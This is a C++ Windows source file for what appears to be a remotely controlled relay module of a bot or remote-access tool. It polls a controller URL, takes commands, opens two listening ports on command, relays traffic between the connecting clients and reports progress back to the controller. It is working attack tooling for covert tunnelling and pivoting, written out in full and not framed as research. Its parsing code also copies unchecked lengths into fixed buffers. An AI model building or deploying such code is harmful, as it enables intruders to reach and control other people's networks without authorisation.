
#include <winsock2.h> 
#pragma comment(lib, "ws2_32.lib")
#include "Tran.h"

CTran::CTran(CClient *pClient):CBasicManager(pClient)
{
	printf("\tCTran\n");
	ConnectPort=0;
	TransmitPort=0;
	m_hThreadWork=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)WorkThread,(LPVOID)this,0,NULL);
	m_hThreadMonitor=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)MonitorThread,(LPVOID)this,0,NULL);
	m_hThread[0]=m_hThreadWork;
	m_nThreadCount=1;
}

CTran::~CTran()
{
	WaitForSingleObject(m_hThreadMonitor, 2000);
	TerminateThread(m_hThreadMonitor, 0);
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}

DWORD WINAPI CTran::WorkThread(LPVOID lparam)
{
	CTran *pThis = (CTran *)lparam;

	while(!pThis->b_quit)
	{
		Sleep(2000);
	
		char* strVer="1";
		char PostData[32];//注意buf大小
		sprintf(PostData,"ver=%s&id=%03d&type=tran",strVer,pThis->m_id);
		if(pThis==NULL)return 0;
		pThis->Post(TranUrl,PostData);
	}
	return 1;

}
void CTran::OnReceive(LPBYTE lpBuff,DWORD dwSize)
{
	int i;
	for (i=0;i<dwSize;i++)
	{
		if(lpBuff[0]=='R'&&lpBuff[1]=='E'&&lpBuff[2]=='P')break;
		lpBuff++;

	}
	if (i==dwSize)
	{
		printf("NOT FOUND\n");
		return;
	}

	printf("\t%s\n",lpBuff);
	char strPorts[10240];
	memcpy(strPorts,lpBuff+3,dwSize);
	if (memcmp(strPorts,"quit",5)==0)
	{
		b_quit=TRUE;
		//WaitForSingleObject(m_hThreadMonitor, 2000);
		//TerminateThread(m_hThreadMonitor, 0);	
		return;
	}
	if(memcmp(strPorts,"donothing",10)==0)return;

	char* temp=strchr(strPorts,':');
	if(!temp)return;
	
	char strPort1[10];
	char strPort2[10];
	int lstrPorts=strlen(strPorts);
	int ltemp=strlen(temp);
	memcpy(strPort1,strPorts,lstrPorts-ltemp);
	memcpy(strPort2,temp+1,ltemp-1);

	ConnectPort=atoi(strPort1);
	TransmitPort=atoi(strPort2);
	m_hThread[m_nThreadCount++]=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)bind2bind,(LPVOID)this,0,NULL);
   
	//printf("\tDone!!\n");
}

DWORD WINAPI CTran::bind2bind(LPVOID lparam)//listen 架设代理
{
	CTran* pThis=(CTran*)lparam;	
	SOCKET fd1,fd2, sockfd1, sockfd2;
	struct sockaddr_in client1,client2;
	int size1,size2;

	HANDLE hThread=NULL;
	transocket sock;
	

	if((fd1=pThis->create_socket())==0) return 0;
	if((fd2=pThis->create_socket())==0) return 0;

	char strtemp[128];
	char PostData[128];
	sprintf(strtemp,"[+] Listening port %d ......\r\n",pThis->ConnectPort);
	sprintf(PostData,"output=%s",strtemp);
	pThis->Post(TranUrl,PostData);
	
	if(pThis->create_server(fd1, pThis->ConnectPort)==0)
	{
		closesocket(fd1);
		return 0;
	}

    
	sprintf(strtemp,"[+] Listening port %d ......\r\n",pThis->TransmitPort);
	sprintf(PostData,"output=%s",strtemp);
	pThis->Post(TranUrl,PostData);

	if(pThis->create_server(fd2, pThis->TransmitPort)==0)
	{
		closesocket(fd2);
		return 0;
	}


	size1=size2=sizeof(struct sockaddr);
	//while(1)
	//{
		printf("[+] Waiting for Client on port:%d ......\r\n",pThis->ConnectPort);
		if((sockfd1 = accept(fd1,(struct sockaddr *)&client1,&size1))<0)
		{
			printf("[-] Accept1 error.\r\n");
			//continue;
		}

		sprintf(strtemp,"[+] Accept a Client on port %d from %s ......\r\n", pThis->ConnectPort, inet_ntoa(client1.sin_addr));
		sprintf(PostData,"output=%s",strtemp);
		pThis->Post(TranUrl,PostData);

		//printf("[+] Waiting another Client on port:%d....\r\n", pThis->TransmitPort);
		if((sockfd2 = accept(fd2, (struct sockaddr *)&client2, &size2))<0)
		{
			printf("[-] Accept2 error.\r\n");
			closesocket(sockfd1);
			//continue;
		}

		sprintf(strtemp,"[+] Accept a Client on port %d from %s\r\n",pThis->TransmitPort, inet_ntoa(client2.sin_addr));
		sprintf(PostData,"output=%s",strtemp);
		pThis->Post(TranUrl,PostData);
		//printf("[+] Accept Connect OK!\r\n");

		sock.fd1 = sockfd1;
		sock.fd2 = sockfd2;
		
		sprintf(PostData,"output=%s","[+] Transmiting!\r\n\n");
		pThis->Post(TranUrl,PostData);

		pThis->transmitdata(&sock);

		Sleep(1000);
	//}
		pThis->m_nThreadCount--;
	return 1;
}

int CTran::create_socket()
{ 
	int sockfd;

	sockfd=socket(AF_INET,SOCK_STREAM,0);
	if(sockfd<0)
	{
		printf("[-] Create socket error.\r\n");
		return(0);
	}

	return(sockfd);      
}

int CTran::create_server(int sockfd,int port)
{
	struct sockaddr_in srvaddr;
	int on=1;

	memset(&srvaddr, 0, sizeof(struct sockaddr));

	srvaddr.sin_port=htons(port);
	srvaddr.sin_family=AF_INET;
	srvaddr.sin_addr.s_addr=htonl(INADDR_ANY);

	setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR, (char*)&on,sizeof(on)); //so I can rebind the port

	if(bind(sockfd,(struct sockaddr *)&srvaddr,sizeof(struct sockaddr))<0)
	{
		printf("[-] Socket bind error.\r\n");
		return(0);
	}

	if(listen(sockfd,CONNECTNUM)<0)
	{
		printf("[-] Socket Listen error.\r\n");
		return(0);
	}

	return(1);
}


void CTran::transmitdata(transocket* sock)
{

	SOCKET fd1, fd2;
	
	struct timeval timeset;
	fd_set readfd,writefd;
	int result,i=0;
	char read_in1[MAXSIZE],send_out1[MAXSIZE];
	char read_in2[MAXSIZE],send_out2[MAXSIZE];
	int read1=0,totalread1=0,send1=0;
	int read2=0,totalread2=0,send2=0;
	int sendcount1,sendcount2;
	int maxfd;
	struct sockaddr_in client1,client2;
	int structsize1,structsize2;
	char host1[20],host2[20];
	int port1=0,port2=0;
	char tmpbuf[100];

	
	fd1 = sock->fd1;
	fd2 = sock->fd2;

	memset(host1,0,20);
	memset(host2,0,20);
	memset(tmpbuf,0,100);

	structsize1=sizeof(struct sockaddr);
	structsize2=sizeof(struct sockaddr);

	if(getpeername(fd1,(struct sockaddr *)&client1,&structsize1)<0)
	{
		strcpy(host1, "fd1");
	}
	else
	{      
		//printf("[+]got, ip:%s, port:%d\r\n",inet_ntoa(client1.sin_addr),ntohs(client1.sin_port));
		strcpy(host1, inet_ntoa(client1.sin_addr));
		port1=ntohs(client1.sin_port);
	}

	if(getpeername(fd2,(struct sockaddr *)&client2,&structsize2)<0)
	{
		strcpy(host2,"fd2");
	}
	else
	{      
		//printf("[+]got, ip:%s, port:%d\r\n",inet_ntoa(client2.sin_addr),ntohs(client2.sin_port));
		strcpy(host2, inet_ntoa(client2.sin_addr));
		port2=ntohs(client2.sin_port);
	}

	printf("[+] Start Transmit (%s:%d <-> %s:%d) ......\r\n\n", host1, port1, host2, port2);

	maxfd=max(fd1,fd2)+1;
	memset(read_in1,0,MAXSIZE);
	memset(read_in2,0,MAXSIZE);
	memset(send_out1,0,MAXSIZE);
	memset(send_out2,0,MAXSIZE);

	timeset.tv_sec=TIMEOUT;
	timeset.tv_usec=0;

	while(!b_quit)
	{
		FD_ZERO(&readfd);
		FD_ZERO(&writefd); 

		FD_SET((UINT)fd1, &readfd);
		FD_SET((UINT)fd1, &writefd);
		FD_SET((UINT)fd2, &writefd);
		FD_SET((UINT)fd2, &readfd);

		result=select(maxfd,&readfd,&writefd,NULL,&timeset);
		if((result<0) && (errno!=EINTR))
		{
			printf("[-] Select error.\r\n");
			break;
		}
		else if(result==0)
		{
			printf("[-] Socket time out.\r\n");
			break;
		}

		if(FD_ISSET(fd1, &readfd))
		{
			/* must < MAXSIZE-totalread1, otherwise send_out1 will flow */
			if(totalread1<MAXSIZE)
			{
				read1=recv(fd1, read_in1, MAXSIZE-totalread1, 0); 
				if((read1==SOCKET_ERROR) || (read1==0))
				{
					printf("[-] Read fd1 data error,maybe close?\r\n");
					break;
				}

				memcpy(send_out1+totalread1,read_in1,read1);
				sprintf(tmpbuf,"\r\nRecv %5d bytes from %s:%d\r\n", read1, host1, port1);
				printf(" Recv %5d bytes %16s:%d\r\n", read1, host1, port1);
				
				
				totalread1+=read1;
				memset(read_in1,0,MAXSIZE);
			}
		}

		if(FD_ISSET(fd2, &writefd))
		{
			int err=0;
			sendcount1=0;
			while(totalread1>0)
			{
				send1=send(fd2, send_out1+sendcount1, totalread1, 0);
				if(send1==0)break;
				if((send1<0) && (errno!=EINTR))
				{
					printf("[-] Send to fd2 unknow error.\r\n");
					err=1;
					break;
				}

				if((send1<0) && (errno==ENOSPC)) break;
				sendcount1+=send1;
				totalread1-=send1; 

				printf(" Send %5d bytes %16s:%d\r\n", send1, host2, port2);
			}

			if(err==1) break;
			if((totalread1>0) && (sendcount1>0))
			{
				/* move not sended data to start addr */
				memcpy(send_out1,send_out1+sendcount1,totalread1);
				memset(send_out1+totalread1,0,MAXSIZE-totalread1);
			}
			else
				memset(send_out1,0,MAXSIZE);
		} 

		if(FD_ISSET(fd2, &readfd))
		{
			if(totalread2<MAXSIZE)
			{
				read2=recv(fd2,read_in2,MAXSIZE-totalread2, 0); 
				if(read2==0)break;
				if((read2<0) && (errno!=EINTR))
				{
					printf("[-] Read fd2 data error,maybe close?\r\n\r\n");
					break;
				}

				memcpy(send_out2+totalread2,read_in2,read2);
				sprintf(tmpbuf, "\r\nRecv %5d bytes from %s:%d\r\n", read2, host2, port2);
				printf(" Recv %5d bytes %16s:%d\r\n", read2, host2, port2);
			
				totalread2+=read2;
				memset(read_in2,0,MAXSIZE);
			}
		}

		if(FD_ISSET(fd1, &writefd))
		{
			int err2=0;
			sendcount2=0;
			while(totalread2>0)
			{
				send2=send(fd1, send_out2+sendcount2, totalread2, 0);
				if(send2==0)break;
				if((send2<0) && (errno!=EINTR))
				{
					printf("[-] Send to fd1 unknow error.\r\n");
					err2=1;
					break;
				}
				if((send2<0) && (errno==ENOSPC)) break;
				sendcount2+=send2;
				totalread2-=send2; 

				printf(" Send %5d bytes %16s:%d\r\n", send2, host1, port1);
			}
			if(err2==1) break;
			if((totalread2>0) && (sendcount2 > 0))
			{
				/* move not sended data to start addr */
				memcpy(send_out2, send_out2+sendcount2, totalread2);
				memset(send_out2+totalread2, 0, MAXSIZE-totalread2);
			}
			else
				memset(send_out2,0,MAXSIZE);
		} 

		Sleep(5);
	} 

	closesocket(fd1);
	closesocket(fd2);
	

	printf("\r\n[+] OK! I Closed The Two Socket.\r\n"); 
}
DWORD WINAPI CTran::MonitorThread(LPVOID lparam)
{
	CTran *pThis = (CTran *)lparam;
	WaitForMultipleObjects(pThis->m_nThreadCount, pThis->m_hThread, FALSE, INFINITE);
	SetEvent(pThis->m_hEvent);
	return 0;
}
